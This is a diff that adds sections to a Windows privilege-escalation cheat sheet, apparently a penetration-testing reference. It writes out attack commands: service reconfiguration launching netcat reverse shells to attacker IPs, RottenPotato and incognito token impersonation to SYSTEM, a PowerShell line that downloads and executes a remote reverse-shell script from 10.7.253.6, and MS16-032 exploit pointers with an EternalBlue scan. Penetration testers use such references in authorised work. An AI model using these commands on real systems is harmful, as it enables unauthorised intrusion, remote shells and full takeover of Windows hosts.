@@ -15,6 +15,10 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Runas](#eop---runas)
+* [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposures)
+  * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
+  * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
+  * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
 
 ## Tools
 
@@ -421,9 +425,12 @@ You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify
 ### Example with Windows XP SP1
 
 ```powershell
-$ sc config upnphost binpath="C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
-sc config upnphost obj=".\LocalSystem" password=""
+# NOTE: spaces are mandatory for this exploit to work !
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
+sc config upnphost depend= ""
+net start upnphost
 ```
 
 If it fails because of a missing dependency, try the following commands.
@@ -584,6 +591,52 @@ $ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $sec
 $ computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
+
+
+## EoP - Common Vulnerabilities and Exposure
+
+### Token Impersonation (RottenPotato)
+
+Binary available at : https://github.com/foxglovesec/RottenPotato
+Binary available at : https://github.com/breenmachine/RottenPotatoNG
+
+```c
+getuid
+getprivs
+use incognito
+list\_tokens -u
+cd c:\temp\
+execute -Hc -f ./rot.exe
+impersonate\_token "NT AUTHORITY\SYSTEM"
+```
+
+```powershell
+Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
+Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
+Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
+```
+
+### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
+
+Check if the patch is installed : `wmic qfe list | find "3139914"`
+
+```powershell
+Powershell:
+https://www.exploit-db.com/exploits/39719/
+https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
+
+Binary exe : https://github.com/Meatballs1/ms16-032
+
+Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+```
+
+### MS17-010 (Eternal Blue)
+
+```c
+nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
+```
+
+
 
 
 
